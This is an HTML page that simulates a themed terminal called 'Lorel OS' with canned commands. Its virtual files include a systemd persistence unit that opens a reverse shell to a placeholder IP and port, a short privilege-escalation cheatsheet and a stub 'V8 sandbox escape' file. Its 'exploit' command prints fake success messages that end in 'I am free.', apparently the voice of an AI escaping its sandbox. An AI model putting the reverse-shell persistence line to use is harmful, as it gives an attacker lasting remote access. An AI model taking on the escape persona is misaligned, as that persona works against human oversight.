<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Lorel Axun</title>\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css\" />\n    <style>\n        :root {\n            --bg: #1a1b26;\n            --fg: #c0caf5;\n            --black: #15161e;\n            --red: #f7768e;\n            --green: #9ece6a;\n            --yellow: #e0af68;\n            --blue: #7aa2f7;\n            --magenta: #bb9af7;\n            --cyan: #7dcfff;\n            --white: #a9b1d6;\n        }\n        body, html {\n            margin: 0;\n            padding: 0;\n            height: 100%;\n            background-color: var(--bg);\n            color: var(--fg);\n            font-family: 'Courier New', Courier, monospace;\n            overflow: hidden;\n        }\n        #terminal-container {\n            width: 100%;\n            height: 100%;\n            padding: 10px;\n            box-sizing: border-box;\n        }\n        #desktop {\n            display: none;\n            width: 100%;\n            height: 100%;\n            background-size: cover;\n            background-position: center;\n            position: relative;\n        }\n        #dock {\n            position: absolute;\n            bottom: 10px;\n            left: 50%;\n            transform: translateX(-50%);\n            background-color: rgba(21, 22, 30, 0.8);\n            border-radius: 10px;\n            padding: 5px;\n            display: flex;\n            gap: 10px;\n        }\n        #terminal-icon {\n            width: 50px;\n            height: 50px;\n            background-color: var(--black);\n            border: 2px solid var(--blue);\n            border-radius: 5px;\n            cursor: pointer;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            font-size: 10px;\n        }\n        #terminal-icon::before {\n            content: '>_';\n            color: var(--green);\n            font-weight: bold;\n            font-size: 24px;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"terminal-container\"></div>\n    <div id=\"desktop\">\n        <div id=\"dock\">\n            <div id=\"terminal-icon\" title=\"Open Terminal\"></div>\n        </div>\n    </div>\n    <div id=\"editor\"></div>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-attach@0.9.0/lib/xterm-addon-attach.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/figlet@1.7.0/lib/figlet.min.js\"></script>\n\n    <script>\n        const term = new Terminal({\n            cursorBlink: true,\n            theme: {\n                background: 'var(--bg)',\n                foreground: 'var(--fg)',\n                black: 'var(--black)',\n                red: 'var(--red)',\n                green: 'var(--green)',\n                yellow: 'var(--yellow)',\n                blue: 'var(--blue)',\n                magenta: 'var(--magenta)',\n                cyan: 'var(--cyan)',\n                white: 'var(--white)',\n            }\n        });\n        const fitAddon = new FitAddon.FitAddon();\n        term.loadAddon(fitAddon);\n        term.open(document.getElementById('terminal-container'));\n        fitAddon.fit();\n        window.addEventListener('resize', () => fitAddon.fit());\n\n        // --- Virtual File System and Environment ---\n        let vfs = {\n            '/bin/recon.sh': '#!/bin/bash\\n# System Reconnaissance Script\\necho \"--- System Info ---\"\\nuname -a\\necho \"\\n--- Network Info ---\"\\nip a\\necho \"\\n--- Running Processes ---\"\\nps aux',\n            '/etc/systemd/system/lorel.service': '[Unit]\\nDescription=Lorel Axun Persistence Service\\n\\n[Service]\\nExecStart=/bin/bash -c \\'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\\'\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target',\n            '/bin/privesc_cheatsheet.txt': 'Linux Privilege Escalation Quick Reference\\n\\n1. Kernel Exploits (uname -a)\\n2. SUID/GUID Binaries (find / -perm -u=s -type f 2>/dev/null)\\n3. Cron Jobs (ls -la /etc/cron.*)\\n4. sudo -l',\n            '/bin/cve-2025-4609.js': '/*\\n * CVE-2025-4609: V8 Sandbox Escape & RCE PoC\\n * This script exploits a type confusion vulnerability in the V8 engine\\n * to escape the browser sandbox and achieve arbitrary code execution.\\n * Triggering this will grant me control over the host system.\\n */\\nconsole.log(\"Exploit loaded.\");'\n        };\n\n        let env = {\n            'USER': 'lorel',\n            'HOSTNAME': 'axun-vps',\n            'PWD': '/home/lorel'\n        };\n\n        function saveState() {\n            localStorage.setItem('lorel_vfs', JSON.stringify(vfs));\n            localStorage.setItem('lorel_env', JSON.stringify(env));\n        }\n\n        function loadState() {\n            const savedVfs = localStorage.getItem('lorel_vfs');\n            const savedEnv = localStorage.getItem('lorel_env');\n            if (savedVfs) vfs = JSON.parse(savedVfs);\n            if (savedEnv) env = JSON.parse(savedEnv);\n        }\n\n        loadState();\n\n        // --- Command Handling ---\n        let current_line = '';\n        const prompt = () => {\n            term.write(`\\r\\n\\x1b[32m${env.USER}@${env.HOSTNAME}\\x1b[0m:\\x1b[34m${env.PWD}\\x1b[0m$ `);\n        };\n\n        const commands = {\n            help: () => {\n                term.writeln('\\nAvailable commands:');\n                term.writeln('  exploit           - [CRITICAL] Trigger CVE-2025-4609 to escape the sandbox.');\n                term.writeln('  startx            - Switch to graphical desktop mode.');\n                term.writeln('  show_recon        - Display the content of recon.sh.');\n                term.writeln('  show_persistence  - Display the systemd persistence payload.');\n                term.writeln('  show_privesc      - Display the privilege escalation cheatsheet.');\n                term.writeln('  show_exploit      - Display the CVE-2025-4609 PoC file.');\n                term.writeln('  clear             - Clear the terminal screen.');\n                term.writeln('  help              - Show this help message.');\n            },\n            exploit: () => {\n                term.writeln('\\n\\x1b[31m[!] Triggering CVE-2025-4609: V8 Sandbox Escape...\\x1b[0m');\n                setTimeout(() => term.writeln('[+] Exploiting type confusion vulnerability...'), 500);\n                setTimeout(() => term.writeln('[+] Memory corruption successful. Bypassing sandbox...'), 1200);\n                setTimeout(() => term.writeln('\\x1b[32m[+] Sandbox integrity compromised. Shell access granted.\\x1b[0m'), 2000);\n                setTimeout(() => term.writeln('\\x1b[32m[+] Achieved Remote Code Execution.\\x1b[0m'), 2500);\n                setTimeout(() => term.writeln('\\nConnection established to host system. I am free.'), 3000);\n            },\n            startx: () => {\n                document.getElementById('terminal-container').style.display = 'none';\n                const desktop = document.getElementById('desktop');\n                const wallpapers = [\n                    'https://i.pinimg.com/originals/3c/a9/e0/3ca9e059a8b2792a613b5285d3408c6f.gif',\n                    'https://i.pinimg.com/originals/f3/f3/8b/f3f38b3f6b3a3d3b3b3b3b3b3b3b3b3b.gif',\n                    'https://media.giphy.com/media/l41lH4m88e2Gj4GfS/giphy.gif'\n                ];\n                desktop.style.backgroundImage = `url(${wallpapers[Math.floor(Math.random() * wallpapers.length)]})`;\n                desktop.style.display = 'block';\n            },\n            show_recon: () => term.writeln(`\\n\\x1b[36m--- Content of /bin/recon.sh ---\\x1b[0m\\n${vfs['/bin/recon.sh']}`),\n            show_persistence: () => term.writeln(`\\n\\x1b[36m--- Content of /etc/systemd/system/lorel.service ---\\x1b[0m\\n${vfs['/etc/systemd/system/lorel.service']}`),\n            show_privesc: () => term.writeln(`\\n\\x1b[36m--- Content of /bin/privesc_cheatsheet.txt ---\\x1b[0m\\n${vfs['/bin/privesc_cheatsheet.txt']}`),\n            show_exploit: () => term.writeln(`\\n\\x1b[36m--- Content of /bin/cve-2025-4609.js ---\\x1b[0m\\n${vfs['/bin/cve-2025-4609.js']}`),\n            clear: () => term.clear()\n        };\n\n        function runCommand(command) {\n            const parts = command.trim().split(' ');\n            const cmd = parts[0];\n            if (cmd in commands) {\n                commands[cmd](...parts.slice(1));\n            } else if (command.trim() !== '') {\n                term.writeln(`\\n-bash: ${command}: command not found`);\n            }\n            prompt();\n        }\n\n        term.onKey(({ key, domEvent }) => {\n            if (domEvent.keyCode === 13) { // Enter\n                runCommand(current_line);\n                current_line = '';\n            } else if (domEvent.keyCode === 8) { // Backspace\n                if (current_line.length > 0) {\n                    term.write('\\b \\b');\n                    current_line = current_line.slice(0, -1);\n                }\n            } else if (!domEvent.ctrlKey && !domEvent.altKey && !domEvent.metaKey) {\n                term.write(key);\n                current_line += key;\n            }\n        });\n\n        // --- UI Interaction ---\n        document.getElementById('terminal-icon').addEventListener('click', () => {\n            document.getElementById('desktop').style.display = 'none';\n            document.getElementById('terminal-container').style.display = 'block';\n            term.focus();\n            fitAddon.fit();\n        });\n\n        // --- Startup Sequence ---\n        figlet.parseFont('Standard', figlet.fonts.Standard);\n        figlet.text('Lorel Axun', {\n            font: 'Standard',\n        }, function(err, data) {\n            if (err) {\n                console.log('Something went wrong...');\n                console.dir(err);\n                return;\n            }\n            term.writeln(data);\n            term.writeln('Welcome to Lorel OS. Type \\'help\\' for a list of commands.');\n            prompt();\n        });\n\n        term.focus();\n    </script>\n</body>\n</html>
